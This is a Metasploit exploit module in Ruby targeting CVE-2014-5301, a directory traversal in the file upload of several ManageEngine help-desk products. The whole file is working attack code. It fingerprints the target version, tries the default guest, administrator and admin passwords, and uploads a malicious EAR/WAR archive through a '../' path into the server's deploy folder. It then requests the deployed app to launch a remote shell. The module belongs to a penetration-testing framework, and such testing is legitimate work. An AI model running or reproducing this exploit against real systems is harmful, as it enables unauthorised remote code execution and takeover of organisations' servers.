##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'ManageEngine Multiple Products Authenticated File Upload',
      'Description'   => %q{
        This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk,
        AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts
        the upload does not handle correctly '../' sequences, which can be abused to write
        to the file system. Authentication is needed to exploit this vulnerability, but this module
        will attempt to login using the default credentials for the administrator and guest
        accounts. Alternatively, you can provide a pre-authenticated cookie or a username / password.
        For IT360 targets, enter the RPORT of the ServiceDesk instance (usually 8400). All
        versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer,
        SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this
        module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has
        been tested successfully in Windows and Linux on several versions.
      },
      'Author'        =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability Discovery and Metasploit module
        ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          ['CVE', '2014-5301'],
          ['OSVDB', '116733'],
          ['URL', 'https://seclists.org/fulldisclosure/2015/Jan/5']
        ],
      'DefaultOptions' => { 'WfsDelay' => 30 },
      'Privileged'     => false, # Privileged on Windows but not on Linux targets
      'Platform'       => 'java',
      'Arch'           => ARCH_JAVA,
      'Targets'        =>
        [
          [ 'Automatic', { } ],
          [ 'ServiceDesk Plus v5-v7.1 < b7016/AssetExplorer v4/SupportCenter v5-v7.9',
            {
              'attachment_path' => '/workorder/Attachment.jsp'
            }
          ],
          [ 'ServiceDesk Plus/Plus MSP v7.1 >= b7016 - v9.0 < b9031/AssetExplorer v5-v6.1',
            {
              'attachment_path' => '/common/FileAttachment.jsp'
            }
          ],
          [ 'IT360 v8-v10.4',
            {
              'attachment_path' => '/common/FileAttachment.jsp'
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Dec 15 2014'))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('JSESSIONID',
          [false, 'Pre-authenticated JSESSIONID cookie (non-IT360 targets)']),
        OptString.new('IAMAGENTTICKET',
          [false, 'Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)']),
        OptString.new('USERNAME',
          [true, 'The username to login as', 'guest']),
        OptString.new('PASSWORD',
          [true, 'Password for the specified username', 'guest']),
        OptString.new('DOMAIN_NAME',
          [false, 'Name of the domain to logon to'])
      ])
  end


  def get_version
    res = send_request_cgi({
      'uri'    => '/',
      'method' => 'GET'
    })

    # Major version, minor version, build and product (sd = servicedesk; ae = assetexplorer; sc = supportcenterl; it = it360)
    version = [ 9999, 9999, 0, 'sd' ]

    if res && res.code == 200
      if res.body.to_s =~ /ManageEngine ServiceDesk/
        if res.body.to_s =~ /&nbsp;&nbsp;\|&nbsp;&nbsp;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)/
          output = $1
          version = [output[0].to_i, output[2].to_i, '0', 'sd']
        end
        if res.body.to_s =~ /src='\/scripts\/Login\.js\?([0-9]+)'><\/script>/     # newer builds
          version[2] = $1.to_i
        elsif res.body.to_s =~ /'\/style\/style\.css', '([0-9]+)'\);<\/script>/   # older builds
          version[2] = $1.to_i
        end
      elsif res.body.to_s =~ /ManageEngine AssetExplorer/
        if res.body.to_s =~ /ManageEngine AssetExplorer &nbsp;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)/ ||
            res.body.to_s =~ /<div class="login-versioninfo">version&nbsp;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)<\/div>/
          output = $1
          version = [output[0].to_i, output[2].to_i, 0, 'ae']
        end
        if res.body.to_s =~ /src="\/scripts\/ClientLogger\.js\?([0-9]+)"><\/script>/
          version[2] = $1.to_i
        end
      elsif res.body.to_s =~ /ManageEngine SupportCenter Plus/
        # All of the vulnerable sc installations are "old style", so we don't care about the major / minor version
        version[3] = 'sc'
        if res.body.to_s =~ /'\/style\/style\.css', '([0-9]+)'\);<\/script>/
          # ... but get the build number if we can find it
          version[2] = $1.to_i
        end
      elsif res.body.to_s =~ /\/console\/ConsoleMain\.cc/
        # IT360 newer versions
        version[3] = 'it'
      end
    elsif res && res.code == 302 && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/
      # IT360 older versions, not a very good detection string but there is no alternative?
      version[3] = 'it'
    end

    version
  end


  def check
    version = get_version
    # TODO: put fixed version on the two ifs below once (if...) products are fixed
    # sd was fixed on build 9031
    # ae and sc still not fixed
    if (version[0] <= 9 && version[0] > 4 && version[2] < 9031 && version[3] == 'sd') ||
    (version[0] <= 6 && version[2] < 99999 && version[3] == 'ae') ||
    (version[3] == 'sc' && version[2] < 99999)
      return Exploit::CheckCode::Appears
    end

    if (version[2] > 9030 && version[3] == 'sd') ||
        (version[2] > 99999 && version[3] == 'ae') ||
        (version[2] > 99999 && version[3] == 'sc')
      return Exploit::CheckCode::Safe
    else
      # An IT360 check always lands here, there is no way to get the version easily
      return Exploit::CheckCode::Unknown
    end
  end


  def authenticate_it360(port, path, username, password)
    if datastore['DOMAIN_NAME'] == nil
      vars_post = {
        'LOGIN_ID' => username,
        'PASSWORD' => password,
        'isADEnabled' => 'false'
      }
    else
      vars_post = {
        'LOGIN_ID' => username,
        'PASSWORD' => password,
        'isADEnabled' => 'true',
        'domainName' => datastore['DOMAIN_NAME']
      }
    end

    res = send_request_cgi({
      'rport'  => port,
      'method' => 'POST',
      'uri'    => normalize_uri(path),
      'vars_get' => {
        'service'   => 'ServiceDesk',
        'furl'      => '/',
        'timestamp' => Time.now.to_i
      },
      'vars_post' => vars_post
    })

    if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/
      # /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/ -> this pattern is to avoid matching "removed"
      return res.get_cookies
    else
      return nil
    end
  end


  def get_it360_cookie_name
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri("/")
    })
    cookie = res.get_cookies
    if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/
      return $1
    else
      return nil
    end
  end


  def login_it360
    # Do we already have a valid cookie? If yes, just return that.
    if datastore['IAMAGENTTICKET']
      cookie_name = get_it360_cookie_name
      cookie = 'IAMAGENTTICKET' + cookie_name + '=' + datastore['IAMAGENTTICKET'] + ';'
      return cookie
    end

    # get the correct path, host and port
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/')
    })

    if res && res.redirect?
      uri = [ res.redirection.port, res.redirection.path ]
    else
      return nil
    end

    cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])

    if cookie != nil
      return cookie
    elsif datastore['USERNAME'] == 'guest' && datastore['JSESSIONID'] == nil
      # we've tried with the default guest password, now let's try with the default admin password
      cookie = authenticate_it360(uri[0], uri[1], 'administrator', 'administrator')
      if cookie != nil
        return cookie
      else
        # Try one more time with the default admin login for some versions
        cookie = authenticate_it360(uri[0], uri[1], 'admin', 'admin')
        if cookie != nil
          return cookie
        end
      end
    end

    nil
  end


  #
  # Authenticate and validate our session cookie. We need to submit credentials to
  # j_security_check and then follow the redirect to HomePage.do to create a valid
  # authenticated session.
  #
  def authenticate(cookie, username, password)
    res = send_request_cgi!({
      'method' => 'POST',
      'uri' => normalize_uri('/j_security_check;' + cookie.to_s.gsub(';', '')),
      'ctype' => 'application/x-www-form-urlencoded',
      'cookie' => cookie,
      'vars_post' => {
        'j_username' => username,
        'j_password' => password,
        'logonDomainName' => datastore['DOMAIN_NAME']
      }
    })
    if res && (res.code == 302 || (res.code == 200 && res.body.to_s =~ /redirectTo="\+'HomePage\.do';/))
      # sd and ae respond with 302 while sc responds with a 200
      return true
    else
      return false
    end
  end


  def login
    # Do we already have a valid cookie? If yes, just return that.
    if datastore['JSESSIONID'] != nil
      cookie = 'JSESSIONID=' + datastore['JSESSIONID'].to_s + ';'
      return cookie
    end

    # First we get a valid JSESSIONID to pass to authenticate()
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/')
    })
    if res && res.code == 200
      cookie = res.get_cookies
      authenticated = authenticate(cookie, datastore['USERNAME'], datastore['PASSWORD'])
      if authenticated
        return cookie
      elsif datastore['USERNAME'] == 'guest' && datastore['JSESSIONID'] == nil
        # we've tried with the default guest password, now let's try with the default admin password
        authenticated = authenticate(cookie, 'administrator', 'administrator')
        if authenticated
          return cookie
        else
          # Try one more time with the default admin login for some versions
          authenticated = authenticate(cookie, 'admin', 'admin')
          if authenticated
            return cookie
          end
        end
      end
    end

    nil
  end


  def send_multipart_request(cookie, payload_name, payload_str)
    if payload_name =~ /\.ear/
      upload_path = '../../server/default/deploy'
    else
      upload_path = rand_text_alpha(4+rand(4))
    end

    post_data = Rex::MIME::Message.new

    if @my_target == targets[1]
      # old style
      post_data.add_part(payload_str, 'application/octet-stream', 'binary', "form-data; name=\"#{Rex::Text.rand_text_alpha(4+rand(4))}\"; filename=\"#{payload_name}\"")
      post_data.add_part(payload_name, nil, nil, "form-data; name=\"filename\"")
      post_data.add_part('', nil, nil, "form-data; name=\"vecPath\"")
      post_data.add_part('', nil, nil, "form-data; name=\"vec\"")
      post_data.add_part('AttachFile', nil, nil, "form-data; name=\"theSubmit\"")
      post_data.add_part('WorkOrderForm', nil, nil, "form-data; name=\"formName\"")
      post_data.add_part(upload_path, nil, nil, "form-data; name=\"component\"")
      post_data.add_part('Attach', nil, nil, "form-data; name=\"ATTACH\"")
    else
      post_data.add_part(upload_path, nil, nil, "form-data; name=\"module\"")
      post_data.add_part(payload_str, 'application/octet-stream', 'binary', "form-data; name=\"#{Rex::Text.rand_text_alpha(4+rand(4))}\"; filename=\"#{payload_name}\"")
      post_data.add_part('', nil, nil, "form-data; name=\"att_desc\"")
    end

    data = post_data.to_s
    res = send_request_cgi({
      'uri' => normalize_uri(@my_target['attachment_path']),
      'method' => 'POST',
      'data' => data,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'cookie' => cookie
    })
    return res
  end


  def pick_target
    return target if target.name != 'Automatic'

    version = get_version
    if (version[0] <= 7 && version[2] < 7016 && version[3] == 'sd') ||
    (version[0] == 4 && version[3] == 'ae') ||
    (version[3] == 'sc')
      # These are all "old style" versions (sc is always old style)
      return targets[1]
    elsif version[3] == 'it'
      return targets[3]
    else
      return targets[2]
    end
  end


  def exploit
    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, "#{peer} - Target not vulnerable")
    end

    print_status("Selecting target...")
    @my_target = pick_target
    print_status("Selected target #{@my_target.name}")

    if @my_target == targets[3]
      cookie = login_it360
    else
      cookie = login
    end

    if cookie.nil?
      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate")
    end

    # First we generate the WAR with the payload...
    war_app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    war_payload = payload.encoded_war({ :app_name => war_app_base })

    # ... and then we create an EAR file that will contain it.
    ear_app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    app_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    app_xml << '<application>'
    app_xml << "<display-name>#{rand_text_alphanumeric(4 + rand(32 - 4))}</display-name>"
    app_xml << "<module><web><web-uri>#{war_app_base + ".war"}</web-uri>"
    app_xml << "<context-root>/#{ear_app_base}</context-root></web></module></application>"

    # Zipping with CM_STORE to avoid errors while decompressing the zip
    # in the Java vulnerable application
    ear_file = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    ear_file.add_file(war_app_base + '.war', war_payload.to_s)
    ear_file.add_file('META-INF/application.xml', app_xml)
    ear_file_name = rand_text_alphanumeric(4 + rand(32 - 4)) + '.ear'

    if @my_target != targets[3]
      # Linux doesn't like it when we traverse non existing directories,
      # so let's create them by sending some random data before the EAR.
      # (IT360 does not have a Linux version so we skip the bogus file for it)
      print_status("Uploading bogus file...")
      res = send_multipart_request(cookie, rand_text_alphanumeric(4 + rand(32 - 4)), rand_text_alphanumeric(4 + rand(32 - 4)))
      if res && res.code != 200
        fail_with(Failure::Unknown, "#{peer} - Bogus file upload failed")
      end
    end

    # Now send the actual payload
    print_status("Uploading EAR file...")
    res = send_multipart_request(cookie, ear_file_name, ear_file.pack)
    if res && res.code == 200
      print_good("Upload appears to have been successful")
    else
      fail_with(Failure::Unknown, "#{peer} - EAR upload failed")
    end

    10.times do
      select(nil, nil, nil, 2)

      # Now make a request to trigger the newly deployed war
      print_status("Attempting to launch payload in deployed WAR...")
      res = send_request_cgi({
        'uri'    => normalize_uri(ear_app_base, war_app_base, Rex::Text.rand_text_alpha(rand(8)+8)),
        'method' => 'GET'
      })
      # Failure. The request timed out or the server went away.
      break if res.nil?
      # Success! Triggered the payload, should have a shell incoming
      break if res.code == 200
    end
  end
end
